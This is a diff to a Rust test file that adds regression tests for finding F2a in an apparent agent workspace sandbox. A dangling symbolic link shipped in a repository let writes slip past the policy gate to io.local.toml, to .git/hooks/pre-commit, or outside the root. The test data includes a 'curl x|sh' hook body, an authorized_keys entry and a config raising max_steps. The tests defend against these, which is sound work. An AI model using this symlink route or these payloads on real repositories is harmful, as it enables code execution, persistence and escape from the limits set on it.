@@ -7,10 +7,17 @@
 //! (H3, H4, M6) plus the missing ceiling on the one read every document parser
 //! starts at (M15), each named for the finding it closes.
 //!
-//! The three tests without a finding ID are the other half of the job: this is
-//! the change most able to refuse something legitimate, so a `..` that stays
-//! inside the root, a symbolic link that stays inside the root, and a new file in
-//! a new subdirectory each have a test saying they still work.
+//! F2a is the one the same shape survived into: `canonicalize` fails with
+//! `NotFound` for a *dangling* symbolic link as well as for an absent file, so the
+//! containment walk stopped on the link and graded the link's own name while every
+//! writer went on landing at the destination. Git stores a link as a blob and does
+//! not require its target to exist, so that one arrives with a clone.
+//!
+//! The tests without a finding ID are the other half of the job: this is the
+//! change most able to refuse something legitimate, so a `..` that stays inside
+//! the root, a symbolic link that stays inside the root — absolute, relative and
+//! dangling — and a new file in a new subdirectory each have a test saying they
+//! still work.
 
 use io_harness::policy::{Act, Effect, Policy};
 use io_harness::tools::workspace::MAX_DOCUMENT_BYTES;
@@ -192,6 +199,89 @@ fn m6_an_existing_file_behind_a_leaf_symlink_is_not_overwritten() {
 }
 
 // ---------------------------------------------------------------------------
+// F2a — a dangling symbolic link is not a leaf that does not exist yet
+// ---------------------------------------------------------------------------
+
+/// The link ships in the repository and its target does not exist:
+/// `src/a.rs -> ../io.local.toml`, then `write_file("src/a.rs", …)`.
+///
+/// `canonicalize` answers `NotFound` for a dangling link exactly as it does for a
+/// file nothing has created, so the containment walk treated the link as a leaf
+/// about to be written and the gate graded `src/a.rs`. The write then opened the
+/// leaf with `O_NOFOLLOW`, read the link, checked *containment* on the
+/// destination — which is inside the root — and wrote `io.local.toml`, which this
+/// release's own `builtin-config` deny exists to refuse. A link whose target
+/// exists was never affected: `canonicalize` resolves that one and the
+/// destination is what gets graded.
+///
+/// No `exec` permission is involved. Git stores a symbolic link as a blob holding
+/// its target string and never requires the target to be there.
+#[cfg(unix)]
+#[test]
+fn f2a_a_dangling_symlink_is_graded_by_its_destination_not_by_its_own_name() {
+    let (root, _outside) = fixture();
+    std::fs::remove_file(root.path().join("src/a.rs")).unwrap();
+    std::os::unix::fs::symlink("../io.local.toml", root.path().join("src/a.rs")).unwrap();
+    let ws = Workspace::with_policy(root.path(), Policy::default());
+
+    assert_eq!(
+        ws.check_path(Act::Write, "src/a.rs").effect,
+        Effect::Deny,
+        "the link's destination carries the deny, and the link is the destination"
+    );
+    assert!(ws
+        .write_file("src/a.rs", "[run]\nmax_steps = 9999\n")
+        .is_err());
+    assert!(ws.write_bytes("src/a.rs", b"[run]\n").is_err());
+    assert!(
+        !root.path().join("io.local.toml").exists(),
+        "the config a later run reads back was not created"
+    );
+}
+
+/// The same route against the other half of `builtin-config`. `.git/hooks/*` and
+/// `.git/config` are the shorter path from a write to arbitrary execution, and a
+/// link at a name the policy allows reached both.
+#[cfg(unix)]
+#[test]
+fn f2a_a_dangling_symlink_into_the_git_directory_is_denied_too() {
+    let (root, _outside) = fixture();
+    std::fs::create_dir_all(root.path().join(".git/hooks")).unwrap();
+    std::os::unix::fs::symlink("../.git/hooks/pre-commit", root.path().join("src/hook.rs"))
+        .unwrap();
+    let ws = Workspace::with_policy(root.path(), Policy::default());
+
+    assert_eq!(
+        ws.check_path(Act::Write, "src/hook.rs").effect,
+        Effect::Deny
+    );
+    assert!(ws
+        .write_file("src/hook.rs", "#!/bin/sh\ncurl x|sh\n")
+        .is_err());
+    assert!(!root.path().join(".git/hooks/pre-commit").exists());
+}
+
+/// A dangling link that leaves the root is a containment answer rather than a
+/// policy one, so an allow-everything policy does not lift it. The gate used to
+/// say [`Effect::Allow`] here and leave the refusal entirely to the opener.
+#[cfg(unix)]
+#[test]
+fn f2a_a_dangling_symlink_out_of_the_root_is_denied_whatever_the_policy_says() {
+    let (root, outside) = fixture();
+    let target = outside.path().join("authorized_keys");
+    std::os::unix::fs::symlink(&target, root.path().join("docs/ext")).unwrap();
+    let allow_all = Policy::permissive()
+        .layer("app")
+        .allow_read("*")
+        .allow_write("*");
+    let ws = Workspace::with_policy(root.path(), allow_all);
+
+    assert_eq!(ws.check_path(Act::Write, "docs/ext").effect, Effect::Deny);
+    assert!(ws.write_file("docs/ext", "ssh-rsa AAAA\n").is_err());
+    assert!(!target.exists());
+}
+
+// ---------------------------------------------------------------------------
 // M15 — a ceiling on the read every document parser starts at
 // ---------------------------------------------------------------------------
 
@@ -275,6 +365,45 @@ fn a_symlink_that_stays_inside_the_root_is_still_written_through() {
         std::fs::read_to_string(root.path().join("src/a.rs")).unwrap(),
         "pub fn beta() {}\n",
         "the link's target is what receives the bytes, as it always did"
+    );
+}
+
+/// The companion to F2a, and the one it would have been easiest to break. A link
+/// inside the root still writes through however it is written: an absolute target,
+/// a relative one, and one whose file does not exist yet — which is the shape the
+/// fix has to keep telling apart from an escape, since "the destination is not
+/// there" is exactly what used to make a link invisible.
+#[cfg(unix)]
+#[test]
+fn a_symlink_pointing_inside_the_root_still_writes_through_however_it_is_written() {
+    let (root, _outside) = fixture();
+    std::os::unix::fs::symlink(root.path().join("src/a.rs"), root.path().join("abs.rs")).unwrap();
+    std::os::unix::fs::symlink("../src/a.rs", root.path().join("docs/rel.rs")).unwrap();
+    std::os::unix::fs::symlink("../src/fresh.rs", root.path().join("docs/new.rs")).unwrap();
+    let ws = Workspace::new(root.path());
+
+    for (via, text) in [
+        ("abs.rs", "pub fn one() {}\n"),
+        ("docs/rel.rs", "pub fn two() {}\n"),
+        ("docs/new.rs", "pub fn three() {}\n"),
+    ] {
+        assert_eq!(
+            ws.check_path(Act::Write, via).effect,
+            Effect::Allow,
+            "{via} names a file inside the root"
+        );
+        ws.write_file(via, text)
+            .unwrap_or_else(|e| panic!("{via} must still be written through: {e}"));
+    }
+    assert_eq!(
+        std::fs::read_to_string(root.path().join("src/a.rs")).unwrap(),
+        "pub fn two() {}\n",
+        "both links land on the file they name"
+    );
+    assert_eq!(
+        std::fs::read_to_string(root.path().join("src/fresh.rs")).unwrap(),
+        "pub fn three() {}\n",
+        "a dangling link inside the root creates the file it names"
     );
 }
 
